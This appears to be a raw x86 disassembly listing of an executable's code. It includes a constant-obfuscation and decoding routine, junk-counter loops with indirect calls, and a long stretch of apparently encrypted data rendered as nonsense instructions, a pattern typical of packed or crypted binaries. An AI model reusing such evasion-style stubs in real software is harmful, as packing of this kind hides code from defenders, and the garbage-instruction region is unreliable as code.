  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e644
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4302dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4302dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4302dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eab3
  40991f:	mov    eax,ds:0x4302dd
  409924:	dec    eax
  409925:	mov    ds:0x4302dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430357
  409934:	or     eax,DWORD PTR ds:0x43035f
  40993a:	mov    ds:0x430357,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e650,0x13
  40994c:	cmp    DWORD PTR ds:0x42e650,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e650,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eab7
  409979:	mov    ecx,DWORD PTR ds:0x42e650
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e650,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4302c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4302d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43034f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43034f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43034f,edi
  4099bf:	cmp    DWORD PTR ds:0x43034f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4302bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e947
  4099e8:	cmp    DWORD PTR ds:0x43034f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43034f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43034f,edi
  409a02:	cmp    DWORD PTR ds:0x43034f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43035f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4302b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4302b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4302b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4302b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e883
  409a50:	cmp    DWORD PTR ds:0x4302b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4302b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4302b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4302b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e648
  409a7d:	or     DWORD PTR ds:0x42ec4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	push   eax
  409a95:	ror    DWORD PTR [ecx],0xb
  409a98:	pop    ecx
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a42
  409aa1:	out    0xe7,al
  409aa3:	xor    al,0x4c
  409aa5:	lods   eax,DWORD PTR ds:[esi]
  409aa6:	lods   eax,DWORD PTR ds:[esi]
  409aa7:	fisub  WORD PTR [edx+0x4919ae47]
  409aad:	pusha  
  409aae:	sub    eax,DWORD PTR [eax]
  409ab0:	cmp    BYTE PTR ds:0xcbdbbd06,bh
  409ab6:	in     eax,0x2b
  409ab8:	sub    al,0x12
  409aba:	cmp    BYTE PTR [eax],cl
  409abc:	add    DWORD PTR [ecx],ebx
  409abe:	push   edx
  409abf:	xlat   BYTE PTR ds:[ebx]
  409ac0:	inc    esp
  409ac1:	leave  
  409ac2:	sub    bl,BYTE PTR [edi-0x5093b7af]
  409ac8:	push   ss
  409ac9:	out    dx,eax
  409aca:	call   0xbd7ffc3c
  409acf:	adc    eax,0x6450c3e9
  409ad4:	neg    DWORD PTR [eax-0x7f]
  409ad7:	ins    BYTE PTR es:[edi],dx
  409ad8:	ss das 
  409ada:	lea    esp,[edx]
  409adc:	out    dx,eax
  409add:	aam    0xb9
  409adf:	loope  0x409b34
  409ae1:	ficom  DWORD PTR [ebp+ebp*2+0x17]
  409ae5:	dec    ecx
  409ae6:	mov    ds:0xd3c2e768,al
  409aeb:	mov    ebp,fs
  409aed:	jne    0x409aa8
  409aef:	(bad)  
  409af0:	int3   
  409af1:	hlt    
  409af2:	stos   DWORD PTR es:[edi],eax
  409af3:	repnz push edi
  409af5:	jo     0x409a8f
  409af7:	dec    edx
  409af8:	out    0xaf,eax
  409afa:	xchg   ecx,eax
  409afb:	std    
  409afc:	inc    eax
  409afd:	inc    eax
  409afe:	mov    WORD PTR [eax+0x21],fs
  409b01:	leave  
  409b02:	inc    edx
  409b03:	loopne 0x409ab5
  409b05:	or     eax,edx
  409b07:	fimul  DWORD PTR [edi]
  409b09:	mov    bl,0x7e
  409b0b:	and    DWORD PTR [edx],esp
  409b0d:	or     al,0xf8
  409b0f:	cmp    DWORD PTR [eax],edi
  409b11:	lods   eax,DWORD PTR ds:[esi]
  409b12:	daa    
  409b13:	mov    bh,0x9e
  409b15:	dec    ebp
  409b16:	outs   dx,DWORD PTR ds:[esi]
  409b17:	fstp   st(5)
  409b19:	mov    ecx,DWORD PTR [eax+0x4d]
  409b1c:	shl    BYTE PTR [esp+esi*4],cl
  409b1f:	xchg   esi,eax
  409b20:	cmp    bl,dh
  409b22:	xchg   ecx,eax
  409b23:	jge    0x409b1d
  409b25:	shl    BYTE PTR ds:0x29dc3a1e,cl
  409b2b:	add    DWORD PTR [ebx],edx
  409b2d:	xor    al,0xd5
  409b2f:	push   ss
  409b30:	sbb    eax,0x57ea343f
  409b35:	into   
  409b36:	shl    ebp,1
  409b38:	mov    bl,0x78
  409b3a:	mov    ds,ecx
  409b3c:	add    BYTE PTR [ebx],dl
  409b3e:	mov    esi,0xebbf862
  409b43:	retf   
  409b44:	mov    cs,WORD PTR [ecx]
  409b46:	out    0x73,eax
  409b48:	or     eax,0xbd5a41de
  409b4d:	enter  0xd319,0x34
  409b51:	ja     0x409b7c
  409b53:	xor    BYTE PTR [ecx+0x79b08bae],dh
  409b59:	fwait
  409b5a:	jne    0x409b03
  409b5c:	lahf   
  409b5d:	not    BYTE PTR [ebx]
  409b5f:	adc    al,0x89
  409b61:	and    eax,0x8431d0f0
  409b66:	add    al,0x26
  409b68:	into   
  409b69:	push   0x81da1779
  409b6e:	sbb    al,0xac
  409b70:	push   esi
  409b71:	mov    ah,0xdb
  409b73:	loope  0x409b87
  409b75:	je     0x409b7f
  409b77:	adc    al,al
  409b79:	mov    DWORD PTR [eax-0xa],edx
  409b7c:	imul   esp,esi,0xa879d291
  409b82:	pop    edx
  409b83:	sub    BYTE PTR [eax-0x77],al
  409b86:	nop
  409b87:	pop    esi
  409b88:	gs in  al,dx
  409b8a:	xchg   ecx,eax
  409b8b:	retf   
  409b8c:	daa    
  409b8d:	ret    0xba29
  409b90:	out    0xe8,al
  409b92:	push   ss
  409b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b94:	sbb    eax,0xd326907b
  409b99:	or     cl,bl
  409b9b:	pop    ss
  409b9c:	cmp    dl,ah
  409b9e:	inc    ebp
  409b9f:	xchg   edx,eax
  409ba0:	ins    DWORD PTR es:[edi],dx
  409ba1:	pop    ds
  409ba2:	xchg   ebx,eax
  409ba3:	add    ch,bl
  409ba5:	sbb    BYTE PTR [eax-0x3a],ch
  409ba8:	outs   dx,BYTE PTR ds:[esi]
  409ba9:	int3   
  409baa:	adc    eax,edx
  409bac:	jo     0x409bcd
  409bae:	sbb    dl,dh
  409bb0:	es ins DWORD PTR es:[edi],dx
  409bb2:	push   edx
  409bb3:	iret   
  409bb4:	clc    
  409bb5:	mov    al,BYTE PTR [eax+0x15632fda]
  409bbb:	mov    dl,0x9a
  409bbd:	gs fcomip st,st(4)
  409bc0:	jns    0x409b68
  409bc2:	aaa    
  409bc3:	pop    ebx
  409bc4:	repnz and eax,0x3cc43fcf
  409bca:	je     0x409be2
  409bcc:	jp     0x409bea
  409bce:	dec    esi
  409bcf:	cmp    eax,0x33eb6544
  409bd4:	gs in  eax,dx
  409bd6:	pop    es
  409bd7:	call   0xa879:0xcae5971f
  409bde:	(bad)  
  409bdf:	retf   0x6ce7
  409be2:	ins    DWORD PTR es:[edi],dx
  409be3:	mov    dh,0x91
  409be5:	or     eax,0xb97735d2
  409bea:	imul   ecx,esp,0x9faeba8b
  409bf0:	xor    DWORD PTR [ebp-0x41],esp
  409bf3:	lahf   
  409bf4:	adc    DWORD PTR [ecx+0x45],esi
  409bf7:	cmp    eax,0xfd27bf62
  409bfc:	jmp    0x50ef:0xdfa03256
  409c03:	jbe    0x409c29
  409c05:	mov    edi,0x137435fc
  409c0a:	popa   
  409c0b:	and    DWORD PTR [edx+0x487ea34c],edx
  409c11:	aad    0xa3
  409c13:	dec    eax
  409c14:	aam    0xf4
  409c16:	inc    edi
  409c17:	sub    eax,esp
  409c19:	addr16 push esi
  409c1b:	jp     0x409c58
  409c1d:	fldenv [ebp+edx*4+0xe]
  409c21:	loope  0x409c13
  409c23:	in     al,0xea
  409c25:	mov    ebx,0x6f9c8381
  409c2a:	and    dl,ah
  409c2c:	ins    DWORD PTR es:[edi],dx
  409c2d:	xor    BYTE PTR [esp+eiz*2],0xd5
  409c31:	push   ss
  409c32:	jno    0x409c5d
  409c34:	test   BYTE PTR [ebx-0x3cc3b413],dl
  409c3a:	sub    eax,0xbc454db6
  409c3f:	pop    ebp
  409c40:	or     eax,0xa2ee5111
  409c45:	out    dx,al
  409c46:	test   BYTE PTR [esi-0x29],bl
  409c49:	rol    DWORD PTR ds:[ebx-0x63],cl
  409c4d:	push   0x68b84dcb
  409c52:	ret    0x3f21
  409c55:	sub    ebp,ebx
  409c57:	fidiv  DWORD PTR [eax-0x3bf9879a]
  409c5d:	xor    eax,0x1930402f
  409c62:	push   ebp
  409c63:	xor    ebp,ecx
  409c65:	repz xor al,0xde
  409c68:	test   DWORD PTR [ebp-0x2a],ebx
  409c6b:	jmp    FWORD PTR [esi+0x7]
  409c6e:	adc    BYTE PTR [ebp+0x33],ah
  409c71:	and    al,0xef
  409c73:	pop    ebx
  409c74:	lods   eax,DWORD PTR ds:[si]
  409c76:	pop    edx
  409c77:	add    esp,esi
  409c79:	pop    edx
  409c7a:	add    ah,BYTE PTR [eax]
  409c7c:	mov    bl,0xab
  409c7e:	dec    edi
  409c7f:	push   0x7c
  409c81:	idiv   DWORD PTR [ebx-0x6785efc4]
  409c87:	jl     0x409cf8
  409c89:	cli    
  409c8a:	mov    bh,0xe2
  409c8c:	shr    cl,0x8d
  409c8f:	jno    0x409cbc
  409c91:	or     edi,DWORD PTR [ebx-0x1519095f]
  409c97:	mov    bl,BYTE PTR [esi+0x3d30f89]
  409c9d:	cmc    
  409c9e:	sbb    cl,dh
  409ca0:	sbb    esp,DWORD PTR ds:[esi+0x35]
  409ca4:	std    
  409ca5:	dec    esp
  409ca6:	sbb    ebp,edi
  409ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ca9:	outs   dx,DWORD PTR ds:[esi]
  409caa:	fimul  WORD PTR [edx-0x79]
  409cad:	repz les edx,FWORD PTR [edi+0x68]
  409cb1:	xchg   ebp,eax
  409cb2:	sub    BYTE PTR [edi+0x57],0xd
  409cb6:	adc    DWORD PTR [ecx+0x1a12f97d],0x1e
  409cbd:	sub    eax,esi
  409cbf:	add    edi,DWORD PTR [esi+0x5a144f90]
  409cc5:	xor    DWORD PTR [edi+0x39],ebx
  409cc8:	mul    esp
  409cca:	int    0x69
  409ccc:	mov    eax,ds:0xba0b830
  409cd1:	aas    
  409cd2:	mov    ebx,0xdd433b27
  409cd7:	cmovb  ecx,DWORD PTR [ebp-0x1f74b220]
  409cde:	sar    DWORD PTR [ebx-0x2a],0xe4
  409ce2:	in     eax,0xdb
  409ce4:	loope  0x409d5a
  409ce6:	aaa    
  409ce7:	jmp    FWORD PTR [eax]
  409ce9:	cmp    al,0xb1
  409ceb:	add    cl,dh
  409ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cee:	mov    cl,0x7a
  409cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cf1:	add    al,0xa0
  409cf3:	dec    esp
  409cf4:	retf   0xbeb9
  409cf7:	dec    edi
  409cf8:	jno    0x409ced
  409cfa:	sub    al,0x4e
  409cfc:	cmc    
  409cfd:	mov    WORD PTR [eax],ds
  409cff:	xchg   DWORD PTR [esi],edi
  409d01:	cmp    ch,BYTE PTR [eax+0x18]
  409d04:	jmp    0x409d2e
  409d06:	scas   eax,DWORD PTR es:[edi]
  409d07:	and    BYTE PTR [esi+0x54f5c9fa],dh
  409d0d:	mov    al,ds:0xaf183872
  409d12:	aas    
  409d13:	jg     0x409cdc
  409d15:	std    
  409d16:	jmp    0x409cff
  409d18:	xchg   edx,eax
  409d19:	push   ss
  409d1a:	sbb    DWORD PTR [ecx-0x8b40898],esp
  409d20:	adc    bl,bh
  409d22:	jmp    0x409cea
  409d24:	jae    0x409d35
  409d26:	icebp  
  409d27:	or     al,0xba
  409d29:	(bad)  
  409d2a:	adc    cl,cl
  409d2c:	rcl    BYTE PTR ds:0x26b66b3f,cl
  409d32:	je     0x409d55
  409d34:	scas   al,BYTE PTR es:[edi]
  409d35:	ficomp WORD PTR ds:0x9e65
  409d3a:	mov    al,ds:0x4bee3ee8
  409d3f:	test   DWORD PTR [edi+0x77392377],0x8dfa872f
  409d49:	shl    DWORD PTR [ecx-0x7b],0x19
  409d4d:	imul   edx,DWORD PTR [esi-0x1f],0xffffffbc
  409d51:	loope  0x409d66
  409d53:	mov    ebx,DWORD PTR [esi-0x555b932c]
  409d59:	dec    ecx
  409d5a:	shl    DWORD PTR [ecx],cl
  409d5c:	jle    0x409dba
  409d5e:	leave  
  409d5f:	popa   
  409d60:	inc    esp
  409d61:	sub    DWORD PTR [ebx],edi
  409d63:	sbb    DWORD PTR ds:[edx+0x4c26d543],esp
  409d6a:	dec    eax
  409d6b:	dec    edx
  409d6c:	dec    ecx
  409d6d:	xchg   esp,eax
  409d6e:	test   bl,dh
  409d70:	(bad)  [ecx-0x30d9f3aa]
  409d76:	je     0x409d53
  409d78:	jge    0x409d90
  409d7a:	pop    eax
  409d7b:	fld    TBYTE PTR [edx+0x5f]
  409d7e:	mul    BYTE PTR [edi-0x3f]
  409d81:	and    bl,bl
  409d83:	ins    BYTE PTR es:[edi],dx
  409d84:	lea    ecx,[edx-0x5]
  409d87:	mov    cl,0x12
  409d89:	pushf  
  409d8a:	push   cs
  409d8b:	xchg   esi,eax
  409d8c:	rcl    DWORD PTR [edx],0x8a
  409d8f:	cmp    ebp,DWORD PTR [esi-0x60]
  409d92:	out    dx,eax
  409d93:	neg    DWORD PTR [ecx+0x63]
  409d96:	aaa    
  409d97:	mov    bl,0xe0
  409d99:	dec    esi
  409d9a:	mov    DWORD PTR [ecx],eax
  409d9c:	inc    ebx
  409d9d:	jmp    0x780614b2
  409da2:	cmc    
  409da3:	dec    ebx
  409da4:	lahf   
  409da5:	rcr    DWORD PTR ds:0x3f814788,1
  409dab:	push   es
  409dac:	cld    
  409dad:	xchg   esi,eax
  409dae:	out    0x59,al
  409db0:	out    0x39,al
  409db2:	ret    0x2626
  409db5:	sbb    BYTE PTR [ecx+0x553d7a81],bl
  409dbb:	inc    edi
  409dbc:	mov    cl,0x82
  409dbe:	push   cs
  409dbf:	or     al,0x18
  409dc1:	les    edi,FWORD PTR [ecx]
  409dc3:	fcom   st(4)
  409dc5:	push   edi
  409dc6:	es mov ah,0xc5
  409dc9:	or     dl,al
  409dcb:	addr16 popf 
  409dcd:	inc    edx
  409dce:	dec    esi
  409dcf:	rol    DWORD PTR [ebx],0xc7
  409dd2:	mov    ebx,DWORD PTR ds:0x42e658
  409dd8:	add    ebx,DWORD PTR ds:0x430357
  409dde:	mov    DWORD PTR ds:0x42e658,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4302dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43034f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4302d1
  409e03:	and    DWORD PTR ds:0x4302f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4302cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e25
  409e2b:	push   ebp
  409e2c:	lock out 0x9,al
  409e2f:	fdivr  DWORD PTR [esi+0x7e]
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e25
  409e37:	hlt    
  409e38:	out    0x1c,al
  409e3a:	repz pop eax
  409e3c:	jae    0x409ea4
  409e3e:	inc    ebx
  409e3f:	int3   
  409e40:	cdq    
  409e41:	gs out dx,eax
  409e43:	mov    dl,0x44
  409e45:	cmp    DWORD PTR [esp+ebx*8],0x48
  409e49:	lods   eax,DWORD PTR ds:[esi]
  409e4a:	inc    ecx
  409e4b:	out    0xcc,al
  409e4d:	or     al,0x64
  409e4f:	(bad)  
  409e50:	sti    
  409e51:	inc    edi
  409e52:	icebp  
  409e53:	shr    DWORD PTR [ebx],0x8
  409e56:	neg    BYTE PTR ds:0x7075e51c
  409e5c:	test   al,0xb8
  409e5e:	mov    bl,0x48
  409e60:	push   eax
  409e61:	test   eax,0xc54718d7
  409e66:	jecxz  0x409e7f
  409e68:	pushf  
  409e69:	push   esi
  409e6a:	test   al,0xab
  409e6c:	xchg   esp,eax
  409e6d:	dec    edi
  409e6e:	jo     0x409e8d
  409e70:	cs add al,0x5d
  409e73:	mov    bl,0x6d
  409e75:	mov    dh,0x1c
  409e77:	and    DWORD PTR [edx+0x600306a9],eax
  409e7d:	shl    DWORD PTR [esi],0xac
  409e80:	push   esp
  409e81:	loopne 0x409ecf
  409e83:	inc    eax
  409e84:	(bad)  
  409e85:	jmp    0x57c9:0xc8d57274
  409e8c:	dec    esp
  409e8d:	xchg   esp,eax
  409e8e:	inc    esi
  409e8f:	xchg   ecx,eax
  409e90:	adc    DWORD PTR [edx+0x2ef09753],esp
  409e96:	mov    DWORD PTR [eax+0x370e1c00],ebx
  409e9c:	adc    al,0x57
  409e9e:	hlt    
  409e9f:	and    dl,0xd1
  409ea2:	adc    DWORD PTR [ebx+0x70],eax
  409ea5:	es inc esp
  409ea7:	aas    
  409ea8:	xchg   ebx,edx
  409eaa:	inc    eax
  409eab:	push   0x4f
  409ead:	adc    al,0x95
  409eaf:	fstp   TBYTE PTR [ebp-0x6]
  409eb2:	push   esp
  409eb3:	push   es
  409eb4:	ja     0x409ec9
  409eb6:	xor    DWORD PTR [eax],ecx
  409eb8:	mov    dh,0xc5
  409eba:	jnp    0x409e6d
  409ebc:	call   0x4ff0fb60
  409ec1:	popf   
  409ec2:	leave  
  409ec3:	dec    esi
  409ec4:	and    al,dh
  409ec6:	and    DWORD PTR [edi],ebx
  409ec8:	pushf  
  409ec9:	out    0x35,al
  409ecb:	mov    BYTE PTR [ebp+0x6eff54c1],bh
  409ed1:	push   ebx
  409ed2:	(bad)  
  409ed4:	shl    DWORD PTR [esi+ebp*2-0x6455044b],cl
  409edb:	pop    ax
  409edd:	aaa    
  409ede:	inc    esp
  409edf:	(bad)  
  409ee0:	dec    edx
  409ee1:	and    cl,dl
  409ee3:	xchg   esi,eax
  409ee4:	and    DWORD PTR ds:0xff2af68,ebx
  409eea:	fisub  DWORD PTR [ebx-0x47]
  409eed:	stc    
  409eee:	shl    DWORD PTR [esi],0x8b
  409ef1:	ins    DWORD PTR es:[edi],dx
  409ef2:	das    
  409ef3:	or     eax,0xa742b512
  409ef8:	pushf  
  409ef9:	dec    esp
  409efa:	mov    al,0x52
  409efc:	add    DWORD PTR [esi],ebx
  409efe:	jnp    0x409f0c
  409f00:	or     ebp,esi
  409f02:	jge    0x409eed
  409f04:	mov    al,ds:0xd39a2318
  409f09:	jp     0x409f2a
  409f0b:	cld    
  409f0c:	adc    al,0x26
  409f0e:	stc    
  409f0f:	sub    esi,DWORD PTR [eax]
  409f11:	icebp  
  409f12:	push   eax
  409f13:	cwde   
  409f14:	cmp    edx,ebp
  409f16:	sub    DWORD PTR [ecx],esi
  409f18:	or     bl,bh
  409f1a:	lds    ebp,FWORD PTR [edi+0x5f]
  409f1d:	mov    dl,0xbe
  409f1f:	into   
  409f20:	bnd jge 0x409ef2
  409f23:	cdq    
  409f24:	mov    bl,0x62
  409f26:	or     al,bl
  409f28:	mov    esi,DWORD PTR ds:0x15de9aa
  409f2e:	sub    dh,ah
  409f30:	dec    eax
  409f31:	push   ecx
  409f32:	mov    edx,DWORD PTR [edx+0x5d71ed3e]
  409f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f39:	and    cl,dh
  409f3b:	or     BYTE PTR [edx+0xe5e88b],0xb6
  409f42:	mov    dl,0x16
  409f44:	sub    ebx,DWORD PTR [ebp+0x1a70cc44]
  409f4a:	pop    es
  409f4b:	cmp    eax,0xeb7bfd61
  409f50:	add    BYTE PTR [edx-0x28d732fa],al
  409f56:	loope  0x409fd2
  409f58:	shr    DWORD PTR [ebx+eiz*2-0x38e5bfa8],1
  409f5f:	add    al,0x16
  409f61:	and    DWORD PTR [esi-0x64],0x5aa6dca
  409f68:	ins    BYTE PTR es:[edi],dx
  409f69:	xchg   edi,eax
  409f6a:	push   ss
  409f6b:	outs   dx,DWORD PTR ds:[esi]
  409f6c:	adc    BYTE PTR [ecx+ecx*8+0x56],bh
  409f70:	lea    ebx,[ebx+0x35a7cfe3]
  409f76:	jno    0x409fb4
  409f78:	mov    DWORD PTR [esi+0x5ce4c60a],esp
  409f7e:	int    0x24
  409f80:	jmp    0xdcb11297
  409f85:	push   edx
  409f86:	mov    al,0x55
  409f88:	xlat   BYTE PTR ds:[ebx]
  409f89:	add    eax,0xdae85094
  409f8e:	and    ebp,DWORD PTR [ebx+ebp*1+0x34]
  409f92:	icebp  
  409f93:	ins    DWORD PTR es:[edi],dx
  409f94:	repnz xor eax,0x70e30c35
  409f9a:	jnp    0x40a014
  409f9c:	fisttp WORD PTR fs:[ebx]
  409f9f:	jae    0x409f22
  409fa1:	or     edx,ebp
  409fa3:	cmp    ah,ah
  409fa5:	rcr    esp,cl
  409fa7:	arpl   dx,cx
  409fa9:	icebp  
  409faa:	add    DWORD PTR [ebp+0x6f41119e],ecx
  409fb0:	ins    DWORD PTR es:[edi],dx
  409fb1:	cli    
  409fb2:	adc    edi,DWORD PTR ss:[ecx+0xf03b985]
  409fb9:	mov    BYTE PTR [ebx+0x6e],bh
  409fbc:	je     0x409f45
  409fbe:	adc    dl,bl
  409fc0:	out    dx,al
  409fc1:	and    ebx,eax
  409fc3:	pushf  
  409fc4:	mov    al,ds:0xf26a3832
  409fc9:	sub    eax,0x5020fe00
  409fce:	mov    cl,BYTE PTR [eax]
  409fd0:	jp     0x40a00a
  409fd2:	jmp    0x5cf5:0x49cb2172
  409fd9:	and    DWORD PTR [eax-0x33],ecx
  409fdc:	mov    eax,0x29c7c160
  409fe1:	(bad)  
  409fe2:	pop    ebx
  409fe3:	gs or  al,0xbd
  409fe6:	inc    ebp
  409fe7:	fmul   QWORD PTR [esi+eiz*8]
  409fea:	sbb    al,0xae
  409fec:	es es adc bl,bh
  409ff0:	icebp  
  409ff1:	xor    al,0xf8
  409ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ff4:	mov    BYTE PTR [ebx+0x48],ah
  409ff7:	es jnp 0x409ff3
  409ffa:	push   eax
  409ffb:	enter  0xe604,0xc1
  409fff:	lea    esp,[ebx-0x35]
  40a002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a003:	call   0xbec4d93d
  40a008:	fcom   DWORD PTR [eax-0x84516d9]
  40a00e:	fistp  DWORD PTR [edi-0x60acecdb]
  40a014:	cld    
  40a015:	xchg   dl,dh
  40a017:	xchg   edi,eax
  40a018:	or     esi,DWORD PTR [esi]
  40a01a:	jne    0x40a07f
  40a01c:	mov    esp,gs
  40a01e:	xchg   edi,eax
  40a01f:	mov    al,ds:0x27c01eb4
  40a024:	(bad)  
  40a026:	scas   eax,DWORD PTR es:[edi]
  40a027:	xchg   edx,eax
